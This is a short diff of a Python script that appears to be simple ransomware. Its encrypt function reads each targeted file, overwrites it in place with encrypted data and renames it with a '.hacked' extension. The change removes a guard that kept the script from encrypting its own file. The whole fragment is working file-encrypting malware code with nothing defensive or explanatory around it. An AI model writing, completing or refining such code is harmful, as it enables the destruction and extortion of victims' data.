@@ -42,18 +42,15 @@ def encrypt_file(path, key, data):
 		return data2
 
 def encrypt(path, key):
-	if sys.argv[0] in path:
-		pass
-	else:
-		with open(path, 'rb') as f:
-			data = f.read()
-		f.close()
-
-		with open(path, 'wb') as f:
-			f.write(encrypt_file(path, key, data))
-		f.close()
+	with open(path, 'rb') as f:
+		data = f.read()
+	f.close()
+	
+	with open(path, 'wb') as f:
+		f.write(encrypt_file(path, key, data))
+	f.close()
 			
-		os.rename(path, path+'.hacked')
+	os.rename(path, path+'.hacked')
 
 
 def encryption(path, key):
